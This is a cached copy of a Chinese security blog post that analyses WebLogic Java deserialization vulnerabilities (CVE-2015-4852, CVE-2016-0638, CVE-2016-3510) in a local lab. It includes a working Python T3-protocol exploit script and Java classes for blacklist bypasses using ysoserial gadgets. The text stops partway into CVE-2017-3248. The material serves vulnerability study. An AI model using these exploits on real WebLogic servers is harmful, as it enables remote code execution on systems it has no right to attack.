<!DOCTYPE html>
<!-- saved from url=(0481)http://cache.baiducontent.com/c?m=9f65cb4a8c8507ed19fa950d100b96314a0fdb743ca1804b22818448e435061e5a3dbfed70680704a48726251caf4b5fe1ed35722a012aaa90c89f4aaae1d477719c6269304a8904458347f29e1d74d620e14d99a80e93bfe743e0b9a4d5c85422c951057f83&p=8d6dc64ad4934eab1bac8f211e&newp=8a759a41878912a05aa9df275a53d8224216ed643ad1c44324b9d71fd325001c1b69e7b125231405d6ce7d6304a84d58eaf33678341766dada9fca458ae7c47965&user=baidu&fm=sc&query=weblogic+%B5%F7%CA%D4+10271&qid=bec2228e00002033&p1=11 -->
<html class="no-js"><head><meta http-equiv="Content-Type" content="text/html; charset=GBK">
<!--<base href="https://seaii-blog.com/index.php/2019/12/08/92.html">--><base href=".">
<style>
body{position:relative}
body,form{margin:0!important;padding:0!important}
#bd_snap{font:13px arial;color:#000;background:#fff;text-align:left;padding:13px 0 0 20px}
#bd_snap_txt{clear:both;padding:10px 0 2px;line-height:24px;color:#333}
#bd_snap_note{color:#999;padding-bottom:10px}
#bd_snap a{font:13px arial;color:#00c;text-decoration:underline}
#bd_snap_note a{color:#999}
#bd_snap_head{width:860px;height:44px}
#bd_snap_logo{width:162px;height:38px;display:block;background:url(http://www.baidu.com/img/logo-snap.png) no-repeat;margin-right:15px;float:left}
#bd_snap_search{width:680px;position:absolute;left:209px;top:17px}
#bd_snap_kw{width:531px;margin-right: 0;height:24px;padding:4px 7px;padding:6px 7px 2px\9;font:16px arial;vertical-align:top;border: 1px solid #b6b6b6;border-color: #7b7b7b #b6b6b6 #b6b6b6 #7b7b7b;background: #fff;display:inline-block;border-right-width: 0;border-color: #b8b8b8 transparent #ccc #b8b8b8;overflow: hidden;outline:0}
#bd_snap_kw:hover{border-color: #999 transparent #b3b3b3 #999;}
#bd_snap_kw:focus{border-color: #4791ff transparent #4791ff #4791ff}
#bd_snap_su{width:100px;height:34px;font-size:14px;color:#fff;padding:0;letter-spacing: 1px;background: #3385ff; border-bottom: 1px solid #2d78f4;outline: medium;-webkit-appearance: none;-webkit-border-radius: 0;cursor:pointer;border:0}
#bd_snap_search input.bd_snap_btn_h{background: #3075dc;box-shadow: inset 1px 1px 3px #2964bb;-webkit-box-shadow: inset 1px 1px 3px #2964bb;-moz-box-shadow: inset 1px 1px 3px #2964bb;-o-box-shadow: inset 1px 1px 3px #2964bb;}
#bd_snap_search input.btnhover{background: #317ef3;border-bottom: 1px solid #2868c8;box-shadow: 1px 1px 1px #ccc;}
#bd_snap_btn_wr{width:97px;height:34px;display:inline-block;_top:1px;*position:relative}
#bd_snap_ln{height:1px;border-top:1px solid #ACA899;background:#ECE9D8;overflow:hidden}
#bd_snap_txt span a{text-decoration:none}
</style>


</head><body class=""><div id="bd_snap">
    <div id="bd_snap_head">
        <a href="http://www.baidu.com/" id="bd_snap_logo" title="到百度首页"></a>
    </div>
    <div id="bd_snap_txt">您查询的关键词是：<span><a style="color:black;background-color:#ffff66;padding:0 3px;font-weight:bold" href="http://cache.baiducontent.com/c?m=9f65cb4a8c8507ed19fa950d100b96314a0fdb743ca1804b22818448e435061e5a3dbfed70680704a48726251caf4b5fe1ed35722a012aaa90c89f4aaae1d477719c6269304a8904458347f29e1d74d620e14d99a80e93bfe743e0b9a4d5c85422c951057f83&amp;p=8d6dc64ad4934eab1bac8f211e&amp;newp=8a759a41878912a05aa9df275a53d8224216ed643ad1c44324b9d71fd325001c1b69e7b125231405d6ce7d6304a84d58eaf33678341766dada9fca458ae7c47965&amp;user=baidu&amp;fm=sc&amp;query=weblogic+%B5%F7%CA%D4+10271&amp;qid=bec2228e00002033&amp;p1=11#baidusnap0">weblogic</a><a style="color:black;background-color:#A0FFFF;padding:0 3px;font-weight:bold" href="http://cache.baiducontent.com/c?m=9f65cb4a8c8507ed19fa950d100b96314a0fdb743ca1804b22818448e435061e5a3dbfed70680704a48726251caf4b5fe1ed35722a012aaa90c89f4aaae1d477719c6269304a8904458347f29e1d74d620e14d99a80e93bfe743e0b9a4d5c85422c951057f83&amp;p=8d6dc64ad4934eab1bac8f211e&amp;newp=8a759a41878912a05aa9df275a53d8224216ed643ad1c44324b9d71fd325001c1b69e7b125231405d6ce7d6304a84d58eaf33678341766dada9fca458ae7c47965&amp;user=baidu&amp;fm=sc&amp;query=weblogic+%B5%F7%CA%D4+10271&amp;qid=bec2228e00002033&amp;p1=11#baidusnap1">调试</a><a style="color:black;background-color:#99ff99;padding:0 3px;font-weight:bold" href="http://cache.baiducontent.com/c?m=9f65cb4a8c8507ed19fa950d100b96314a0fdb743ca1804b22818448e435061e5a3dbfed70680704a48726251caf4b5fe1ed35722a012aaa90c89f4aaae1d477719c6269304a8904458347f29e1d74d620e14d99a80e93bfe743e0b9a4d5c85422c951057f83&amp;p=8d6dc64ad4934eab1bac8f211e&amp;newp=8a759a41878912a05aa9df275a53d8224216ed643ad1c44324b9d71fd325001c1b69e7b125231405d6ce7d6304a84d58eaf33678341766dada9fca458ae7c47965&amp;user=baidu&amp;fm=sc&amp;query=weblogic+%B5%F7%CA%D4+10271&amp;qid=bec2228e00002033&amp;p1=11#baidusnap2">10271</a></span>  <span style="margin-left:5px">以下是该网页在北京时间 2019年12月09日 06:59:12 的快照；</span>
        <p>如果打开速度慢，可以尝试<a href="http://cache.baiducontent.com/c?m=9f65cb4a8c8507ed19fa950d100b96314a0fdb743ca1804b22818448e435061e5a3dbfed70680704a48726251caf4b5fe1ed35722a012aaa90c89f4aaae1d477719c6269304a8904458347f29e1d74d620e14d99a80e93bfe743e0b9a4d5c85422c951057f83&amp;p=8d6dc64ad4934eab1bac8f211e&amp;newp=8a759a41878912a05aa9df275a53d8224216ed643ad1c44324b9d71fd325001c1b69e7b125231405d6ce7d6304a84d58eaf33678341766dada9fca458ae7c47965&amp;user=baidu&amp;fm=sc&amp;query=weblogic+%B5%F7%CA%D4+10271&amp;qid=bec2228e00002033&amp;p1=11&amp;fast=y">快速版</a>；如果想更新或删除快照，可以<a href="http://help.baidu.com/newadd?prod_id=1&amp;category=1&amp;link=http%3A%2F%2Fcache.baiducontent.com%2Fc%3Fm%3D9f65cb4a8c8507ed19fa950d100b96314a0fdb743ca1804b22818448e435061e5a3dbfed70680704a48726251caf4b5fe1ed35722a012aaa90c89f4aaae1d477719c6269304a8904458347f29e1d74d620e14d99a80e93bfe743e0b9a4d5c85422c951057f83%26p%3D8d6dc64ad4934eab1bac8f211e%26newp%3D8a759a41878912a05aa9df275a53d8224216ed643ad1c44324b9d71fd325001c1b69e7b125231405d6ce7d6304a84d58eaf33678341766dada9fca458ae7c47965%26user%3Dbaidu%26fm%3Dsc%26query%3Dweblogic%2B%25B5%25F7%25CA%25D4%2B10271%26qid%3Dbec2228e00002033%26p1%3D11" id="bd_tousu">投诉快照</a>。
        </p>
    </div>
<script>document.getElementById('bd_tousu').href = 'http://help.baidu.com/newadd?prod_id=1&category=1&link=' + encodeURIComponent(document.location);</script>
    <div id="bd_snap_note">百度和网页 <a href="https://seaii-blog.com/index.php/2019/12/08/92.html">https://seaii-blog.com/index.php/2019/12/08/92.html</a> 的作者无关，不对其内容负责。百度快照谨为网络故障时之索引，不代表被搜索网站的即时页面。</div>
</div>
<div id="bd_snap_search">
	<form action="http://www.baidu.com/s"><input name="cl" type="hidden" value="3"><input name="wd" id="bd_snap_kw" maxlength="100"><span id="bd_snap_btn_wr"><input type="submit" id="bd_snap_su" value="百度一下" class="bd_snap_btn" onmouseover="this.className=&#39;bd_snap_btn bd_snap_btn_h&#39;" onmousedown="this.className=&#39;bd_snap_btn btnhover&#39;" onmouseup="this.className=&#39;bd_snap_btn&#39;" onmouseout="this.className=&#39;bd_snap_btn&#39;"></span></form>
</div>
<div id="bd_snap_ln"></div>
<div style="position:relative">

<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!-->  <!--<![endif]-->


<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<meta name="renderer" content="webkit">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>weblogic漏洞调试笔记 - Seaii's Blog</title>

    <link rel="stylesheet" href="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/css">
    <link rel="stylesheet" href="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/css(1)">
<!-- 使用url函数转换相关路径 -->
<link rel="stylesheet" href="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/normalize.min.css">
<link rel="stylesheet" href="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/font-awesome.min.css">
<link rel="stylesheet" href="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/base.css">

<link rel="stylesheet" href="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/nprogress.min.css">

    <link rel="stylesheet" href="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/tomorrow.min.css">
    
<link rel="stylesheet" href="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/theme.css">
<link rel="shortcut icon" href="https://seaii-blog.com/favicon.ico">







<!--[if lt IE 9]>


<![endif]-->

<!-- 通过自有函数输出HTML头部信息 -->
<meta name="description" content="0x00 前言java知识补漏行动最后一站――weblogic。知识从来是越学越多的，何况java博大精深，想在短时间全部掌握根本不可能。但是经过这一波学习之后，再遇到java的漏洞至少不会束手...">
<meta name="keywords" content="java,weblogic,反序列化,xmldecoder">
<meta name="template" content="Mirages">
<link rel="pingback" href="https://seaii-blog.com/index.php/action/xmlrpc">
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://seaii-blog.com/index.php/action/xmlrpc?rsd">
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://seaii-blog.com/index.php/action/xmlrpc?wlw">
<link rel="alternate" type="application/rss+xml" title="weblogic漏洞调试笔记 &#187; Seaii&#39;s Blog &#187; RSS 2.0" href="https://seaii-blog.com/index.php/feed/2019/12/08/92.html">
<link rel="alternate" type="application/rdf+xml" title="weblogic漏洞调试笔记 &#187; Seaii&#39;s Blog &#187; RSS 1.0" href="https://seaii-blog.com/index.php/feed/rss/2019/12/08/92.html">
<link rel="alternate" type="application/atom+xml" title="weblogic漏洞调试笔记 &#187; Seaii&#39;s Blog &#187; ATOM 1.0" href="https://seaii-blog.com/index.php/feed/atom/2019/12/08/92.html">

<link rel="stylesheet" type="text/css" href="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/foundation.css">

<style type="text/css">
    /*根据操作系统及浏览器优化font-family*/

</style>
<style type="text/css">
    /*根据操作系统及浏览器进行样式修正*/

    /*桌面端*/
    #index .post .post-title:hover,#archive .post .post-title:hover {
        color: #1abc9c;
    }
    #index .more>a:hover,#archive .more>a:hover {
        color: #FFF !important;
        border: 1px solid #1abc9c;
        background-color: rgba(24,188,156,0.5);
        width: 250px;
    }
    .link-box a:hover {
        box-shadow: 0 22px 43px rgba(0, 0, 0, 0.15);
        -webkit-box-shadow: 0 22px 43px rgba(0, 0, 0, 0.15);
        color: #1abc9c;
        -webkit-transform: translateY(-4px);
        transform: translateY(-4px);
        -moz-transform: none;
    }
    #wrap.display-nav #body, #footer.display-nav {
        -webkit-filter: blur(10px);
        -moz-filter: blur(10px);
        -ms-filter: blur(10px);
        -o-filter: blur(10px);
        filter: blur(10px);
    }

    /*Not Safari*/
    /*
    *webkit浏览器滚动条样式
    */
    ::-webkit-scrollbar {
        height:8px;
        width:6px;
    }
    ::-webkit-scrollbar-button {
        height:0;
        width:0;
    }
    ::-webkit-scrollbar-button:start:decrement,::-webkit-scrollbar-button:end:increment {
        display:block;
    }
    ::-webkit-scrollbar-button:vertical:start:increment,::-webkit-scrollbar-button:vertical:end:decrement {
        display:none;
    }
    ::-webkit-scrollbar-track:vertical,::-webkit-scrollbar-track:horizontal,::-webkit-scrollbar-thumb:vertical,::-webkit-scrollbar-thumb:horizontal,::-webkit-scrollbar-track:vertical,::-webkit-scrollbar-track:horizontal,::-webkit-scrollbar-thumb:vertical,::-webkit-scrollbar-thumb:horizontal {
        border-style:solid;
        border-color:transparent;
    }
    ::-webkit-scrollbar-track:vertical::-webkit-scrollbar-track:horizontal{
        background-clip:padding-box;
        background-color:#fff;
    }
    ::-webkit-scrollbar-thumb {
        -webkit-box-shadow:inset 1px 1px 0 rgba(0,0,0,.1),inset 0 -1px 0 rgba(0,0,0,.07);
        background-clip:padding-box;
        background-color:rgba(0,0,0,.5);
        min-height:28px;
        padding-top:100px;
    }
    ::-webkit-scrollbar-thumb:hover {
        -webkit-box-shadow:inset 1px 1px 1px rgba(0,0,0,.25);
        background-color:rgba(0,0,0,.4);
    }
    ::-webkit-scrollbar-thumb:active {
        -webkit-box-shadow:inset 1px 1px 3px rgba(0,0,0,.35);
        background-color:rgba(0,0,0,.5);
    }
    ::-webkit-scrollbar-track:vertical,::-webkit-scrollbar-track:horizontal,::-webkit-scrollbar-thumb:vertical,::-webkit-scrollbar-thumb:horizontal {
        border-width:0;
    }
    ::-webkit-scrollbar-track:hover {
        -webkit-box-shadow:inset 1px 0 0 rgba(0,0,0,.1);
        background-color:rgba(0,0,0,.05);
    }
    ::-webkit-scrollbar-track:active {
        -webkit-box-shadow:inset 1px 0 0 rgba(0,0,0,.14),inset -1px -1px 0 rgba(0,0,0,.07);
        background-color:rgba(0,0,0,.05);
    }
    /*
     *  end webkit浏览器滚动条样式
     */


</style>
<style type="text/css">
    /** 页面样式调整 */
    div#comments{
        margin-top: 0;
    }

</style>

    
<!--[if lt IE 9]>
<div class="browsehappy" role="dialog">当前网页 <strong>不支持</strong> 你正在使用的浏览器. 为了正常的访问, 请 <a href="http://browsehappy.com/">升级你的浏览器</a>.</div>
<![endif]-->

<span id="backtop" class="waves-effect waves-button"><i class="fa fa-angle-up"></i></span>
<div id="wrap">
    <a id="toggle-nav"><i class="fa fa-bars"></i></a>
<div id="canvas">
    <div id="nav">
        <div class="author">
            <!-- <a href="https://seaii-blog.com/about.html">
                <img src="" alt="Avatar" width="100" height="100"/> -->
                <img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/6db2b7fa14222d62b41082c675016c61.jpg" alt="Avatar" width="100" height="100">
            
        </div>
        <div class="search-box">
            <form class="form" id="search-form">
                <input id="search" type="text" name="s" required="" placeholder="Search here..." class="search">
                <button id="search_btn" type="submit" class="search-btn"><i class="fa fa-search"></i></button>
            </form>
        </div>
        <ul class="menu">
                        <li><a href="https://seaii-blog.com/">Home</a></li>
            <li>
                <a class="slide-toggle">Category</a>
                <div class="category-list hide">
                    <ul class="list"><li class="category-level-0 category-parent"><a href="https://seaii-blog.com/index.php/category/default/">默认分类</a></li><li class="category-level-0 category-parent"><a href="https://seaii-blog.com/index.php/category/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-level-0 category-parent"><a href="https://seaii-blog.com/index.php/category/%E7%BC%96%E7%A8%8B/">编程</a></li><li class="category-level-0 category-parent"><a href="https://seaii-blog.com/index.php/category/%E7%9E%8E%E6%8A%98%E8%85%BE/">瞎折腾</a></li><li class="category-level-0 category-parent"><a href="https://seaii-blog.com/index.php/category/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</a></li><li class="category-level-0 category-parent"><a href="https://seaii-blog.com/index.php/category/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></li><li class="category-level-0 category-parent"><a href="https://seaii-blog.com/index.php/category/CTF/">CTF</a></li><li class="category-level-0 category-parent"><a href="https://seaii-blog.com/index.php/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></li></ul>                </div>
            </li>
                                    <li><a href="https://seaii-blog.com/index.php/links.html" title="友情链接">友情链接</a></li>
                    </ul>
    </div>
</div>

    
    <div id="body">
            
        <div class="container">
            <div class="row">

    
    
<div id="post" role="main">
    <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
                <h2 class="post-title" itemprop="name headline"><a name="baidusnap0"></a><b style="color:black;background-color:#ffff66">weblogic</b>漏洞<a name="baidusnap1"></a><b style="color:black;background-color:#A0FFFF">调试</b>笔记</h2>
        <ul class="post-meta">
            <li itemprop="author" itemscope="" itemtype="http://schema.org/Person">作者: <a itemprop="name" href="https://seaii-blog.com/index.php/author/1/" rel="author">seaii</a></li>
            <li>时间: <time datetime="2019-12-08T17:27:13+00:00" itemprop="datePublished">December 8, 2019</time></li>
                        <li>分类: <a href="https://seaii-blog.com/index.php/category/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></li>
                    </ul>
                <div class="post-content" itemprop="articleBody">
            <h2>0x00 前言</h2>
<p>java知识补漏行动最后一站――<b style="color:black;background-color:#ffff66">weblogic</b>。知识从来是越学越多的，何况java博大精深，想在短时间全部掌握根本不可能。但是经过这一波学习之后，再遇到java的漏洞至少不会束手无策了，“不懂java”也不再是借口了，2333333。</p>
<p>由于<b style="color:black;background-color:#ffff66">weblogic</b>的补丁收费，所以文章中补丁大多是其他师傅文章中的内容，基本都已标明出处。如有遗漏，请联系我添加，并表示深深的歉意。</p>
<!--more-->
<h2>0x01 环境搭建</h2>
<p>大佬已经为我们提供了非常方便的集成<b style="color:black;background-color:#A0FFFF">调试</b>环境：<a href="https://github.com/QAX-A-Team/WeblogicEnvironment"></a><a href="https://github.com/QAX-A-Team/WeblogicEnvironment">https://github.com/QAX-A-Team/WeblogicEnvironment</a>，按照readme操作即可。</p>
<p>接下来是idea的配置，首先打开从docker环境中复制出来的<code>wlserver</code>目录，然后将复制出来的<code>module</code>、<code>wlserver/server/lib</code>添加到library。</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/image-20190819104929880.png" alt=""></p>
<p>然后新建一个远程<b style="color:black;background-color:#A0FFFF">调试</b>。</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/image-20190819105338390.png" alt=""></p>
<p>完成～</p>
<h2>0x02 漏洞分析</h2>
<p><b style="color:black;background-color:#ffff66">weblogic</b>的漏洞中反序列化占大头，反序列化漏洞大体上又分为两类，一类是T3协议，另一类<del>也是T3</del>是XMLDeocder。此外，还有xxe、文件上传等等漏洞。</p>
<h3>T3</h3>
<p>在学习java反序列化漏洞的过程中，不可避免的会碰到RMI，JNDI、JRMP等等名词，先记录一下个人的理解（可能有些片面和不准确）。</p>
<p>其实这几个名词的核心就是java的分布式编程，在主机B上封装了一系列的方法供主机A上的java程序来调用，在这个过程中用到的一些协议和技术。先来一张图：</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/jndiarch.gif" alt=""></p>
<p>我们按图从上到下来说，首先是<strong>JNDI</strong>，官方语言是这样的：</p>
<blockquote>
<p>JNDI(Java Naming and Directory Interface)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口。</p>
</blockquote>
<p>当java需要调用远程服务的时候，需要通过JNDI来寻找可用的远程服务，常见的有：</p>
<pre><code>jdbc://&lt;domain&gt;:&lt;port&gt;
rmi://&lt;domain&gt;:&lt;port&gt;
ldap://&lt;domain&gt;:&lt;port&gt;</code></pre>
<p>这几个都是我们在反序列化漏洞利用非常常见的。</p>
<p>接下来是<strong>RMI</strong>：</p>
<blockquote>
<p>RMI(Remote Method Invocation)即远程方法调用。能够让在某个Java虚拟机上的对象像调用本地对象一样调用另一个Java虚拟机中的对象上的方法。它支持序列化的Java类的直接传输和分布垃圾收集。</p>
</blockquote>
<p>便于理解，我们可以把RMI类比为一个提供api的server，那么client与server之间通信就需要通信协议，Java RMI的默认基础通信协议就是<strong>JRMP</strong>。</p>
<p>最后，就是<strong>T3</strong>，这是<b style="color:black;background-color:#ffff66">weblogic</b> RMI所使用的协议，<b style="color:black;background-color:#ffff66">weblogic</b> RMI是java RMI的一种加强版实现。</p>
<p>接下来我们通过wireshark抓包来看一下T3协议具体的通信过程：</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191121163959.png" alt=""></p>
<p>首先是一个握手包，客户端与服务端通过这次握手来确定双方的身份。如果握手成功，就继续通信。</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191121165317.png" alt=""></p>
<p>看一下请求包的结构，首先标出的4个字节是整个数据包的长度，接下来是从<code>01 65</code>一直到<code>fe010000</code>前面是T3协议的协议头。看到<code>aced0005</code>就非常熟悉了，是反序列化数据的魔术头。一个数据包中可以有好几个反序列化字符串，测试之后发现只有第一个<code>aced</code>前面要加<code>fe100000</code>。所以现在我们就把T3协议的数据包结构理清楚了：</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191121180003.png" alt=""></p>
<p>显然数据包是我们可控的，只要将正常的反序列化数据替换为我们的恶意数据，或者只保留恶意数据，然后重新计算数据包长度，就可以让<b style="color:black;background-color:#ffff66">weblogic</b>反序列化我们传入的恶意数据。</p>
<p>说了这么多，只是为了将java这些令人头大的名词理解清楚，并理解T3协议的原理，为漏洞分析打好基础，下面不多说，开整！</p>
<h4>CVE-2015-4852</h4>
<p><code>server/lib/wlthint3client.jar!/<b style="color:black;background-color:#ffff66">weblogic</b>/rjvm/InboundMsgAbbrev.class</code></p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191121182033.png" alt=""></p>
<p>这个漏洞确实没什么好说的，所有T3协议的请求都会在这个方法中处理。没有任何过滤，<b style="color:black;background-color:#ffff66">weblogic</b>提供了反序列化的入口，gadget使用的是CommonCollection1。调用栈如下：</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191121183845.png" alt=""></p>
<p>附上利用脚本：</p>
<pre><code class="language-python">import socket
import sys
import struct
import re
import subprocess
import binascii

def handshake(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    handshake = "t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n".encode()
    sock.sendall(handshake)
    data = sock.recv(1024)

    pattern = re.compile(r"HELO:(.*).false")
    version = re.findall(pattern, data.decode())
    return version[0] if len(version) &gt; 0 else False

def get_payload1(gadget, command):
    JAR_FILE = '/path/to/ysoserial.jar'
    popen = subprocess.Popen(['java', '-jar', JAR_FILE, gadget, command], stdout=subprocess.PIPE)
    return popen.stdout.read()

def get_payload2(path):
    with open(path, "rb") as f:
        return f.read()

def exp(host, port, payload):
    #print(binascii.b2a_hex(payload).decode())
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    handshake = "t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n".encode()
    sock.sendall(handshake)
    data = sock.recv(1024)
    pattern = re.compile(r"HELO:(.*).false")
    version = re.findall(pattern, data.decode())
    if len(version) == 0:
        print("Not <b style="color:black;background-color:#ffff66">Weblogic</b>")
        return

    print("<b style="color:black;background-color:#ffff66">Weblogic</b> {}".format(version[0]))
    data_len = binascii.a2b_hex(b"00000000") #数据包长度
    t3header = binascii.a2b_hex(b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006") #t3协议头
    flag = binascii.a2b_hex(b"fe010000") #反序列化数据标志
    payload = data_len + t3header + flag + payload
    payload = struct.pack('&gt;I', len(payload)) + payload[4:] #重新计算数据包长度
    sock.send(payload)

if __name__ == "__main__":
    host = "127.0.0.1"
    port = 7001
    gadget = "CommonsCollections1"
    command = "touch /tmp/success"

    #payload = get_payload1(gadget, command)
    payload = get_payload2("")
    #payload = binascii.a2b_hex(b"")
    exp(host, port, payload)</code></pre>
<h5>修复</h5>
<p>在这个漏洞出现之后，<b style="color:black;background-color:#ffff66">weblogic</b>开始对反序列化漏洞进行防御，但是是基本黑名单的防御方式。一旦黑名单被绕过，防护就会被打破，所以在之后<b style="color:black;background-color:#ffff66">weblogic</b>陷入了绕过-加黑名单-绕过的循环之中。</p>
<blockquote>
<p><b style="color:black;background-color:#ffff66">Weblogic</b>的反序列化的点有着三个,黑名单<code>ClassFilter.class</code>也作用于这三个位置。</p>
<ul>
<li><code><b style="color:black;background-color:#ffff66">weblogic</b>.rjvm.InboundMsgAbbrev.class::ServerChannelInputStream</code></li>
<li><code><b style="color:black;background-color:#ffff66">weblogic</b>.rjvm.MsgAbbrevInputStream.class</code></li>
<li><code><b style="color:black;background-color:#ffff66">weblogic</b>.iiop.Utils.class</code></li>
</ul>
</blockquote>
<h4>CVE-2016-0638</h4>
<p>在说这个漏洞之前需要一点前置知识，<code>transient</code>关键字和java反序列化中的<code>Externalizable</code>。</p>
<p><strong>Externalizable</strong></p>
<blockquote>
<p>Externalizable接口extends Serializable接口，而且在其基础上增加了两个方法：writeExternal()和readExternal()。这两个方法会在序列化和反序列化还原的过程中被自动调用，以便执行一些特殊的操作。</p>
</blockquote>
<p><strong>transient</strong></p>
<blockquote>
<p>在实际开发过程中，我们常常会遇到这样的问题，这个类的有些属性需要序列化，而其他属性不需要被序列化，这些信息对应的变量就可以加上transient关键字。换句话说，这个字段的生命周期仅存于调用者的内存中而不会写到磁盘里持久化。</p>
</blockquote>
<p>由此我们找到了<code>server/lib/<b style="color:black;background-color:#ffff66">weblogic</b>.jar!/<b style="color:black;background-color:#ffff66">weblogic</b>/jms/common/StreamMessageImpl.class</code>来进行绕过：</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191123000141.png" alt=""></p>
<p>可以看到在<code>readExternal</code>方法中对writeExternal写入的数据又进行了一次反序列化，图中的var5实质上就是我们传入的恶意反序列化数据。</p>
<p>这里exp构造起来稍微有一点复杂，首先需要定义一个<code>StreamMessageImpl</code>，重写它的<code>writeExternal</code>方法，然后将我们的payload封装进去。</p>
<pre><code class="language-java">package <b style="color:black;background-color:#ffff66">weblogic</b>.jms.common; //重要，与<b style="color:black;background-color:#ffff66">weblogic</b>源码保持一致

import java.io.Externalizable;
import java.io.IOException;
import java.io.ObjectOutput;
import javax.jms.JMSException;
import javax.jms.StreamMessage;

public final class StreamMessageImpl extends MessageImpl implements StreamMessage, Externalizable {
    static final long serialVersionUID = 7748687583664395357L; //必须
    private transient byte[] buffer; //增加transient关键字，不对这个属性进行序列化操作

    public StreamMessageImpl(byte[] buffer) {
        this.buffer = buffer;
    }

    //重写方法，写入恶意数据
    public void writeExternal(ObjectOutput var1) throws IOException {
        super.writeExternal(var1);
        var1.writeByte(1);
        var1.writeInt(this.buffer.length);
        var1.write(this.buffer);
    }
        //后面有一大堆继承抽象类和实现接口要写的方法，不是重点，直接省略
}
</code></pre>
<pre><code class="language-java">package cn.seaii.unser.exp;

import <b style="color:black;background-color:#ffff66">weblogic</b>.jms.common.StreamMessageImpl;

public class CommonCollection1 extends Exp {
    //ysoserial CommonCollections1
    public static Object getObject(String command) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {
        //......
    }

    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        Object object = getObject("touch /tmp/streamMessage");
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//用于存放person对象序列化byte数组的输出流
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(object);

        byte[] buffer = byteArrayOutputStream.toByteArray();
        StreamMessageImpl streamMessage = new StreamMessageImpl(buffer);
        ser(streamMessage);
    }
}</code></pre>
<h4>CVE-2016-3510</h4>
<p>此次绕过使用的是<code><b style="color:black;background-color:#ffff66">weblogic</b>.corba.utils.MarshalledObject</code>，具体来看代码：</p>
<p><code>server/lib/<b style="color:black;background-color:#ffff66">weblogic</b>.jar!/<b style="color:black;background-color:#ffff66">weblogic</b>/corba/utils/MarshalledObject.class</code></p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191122163609.png" alt=""></p>
<p><code>MarshalledObject</code>会将其封装的数据进行一次序列化。</p>
<p><img src="./weblogic漏洞调试笔记 - Seaii&#39;s Blog_files/20191122163210.png" alt=""></p>
<p>由于不再黑名单中，就绕过了过滤正常反序列化，此时<code>MarshalledObject</code>就会将我们的封装进去的恶意数据反序列化，成功利用漏洞。</p>
<p>exp可通过简单仿照ysoserial来写，将生成的反序列化数据放在上面的py脚本中即可：</p>
<pre><code class="language-java">package cn.seaii.unser.exp;

import cn.seaii.unser.exp.Exp;
import <b style="color:black;background-color:#ffff66">weblogic</b>.corba.utils.MarshalledObject;

import java.io.*;

public class CommonCollection1 extends Exp {
    //ysoserial CommonCollections1
    public static Object getObject(String command) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {
        //......
    }

    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        Object object = getObject("touch /tmp/marshall");
        MarshalledObject marshalledObject = new MarshalledObject(object);
        //unser(object);
        ser(marshalledObject);
    }
}</code></pre>
<h4>CVE-2017-3248</h4>
<p>这次绕过利用的是JRMPClient，之前提到过，JRMP是Java RMI的默认基础通信协议，这种利用方式我们在shiro的反序列化利用中也有过了解。基本原理是通过应用的反序列化漏洞构造一个JRMP的client，去连接我们预置的恶意server，client读取server返回的数据，然后反序列化，触发漏洞。</p>
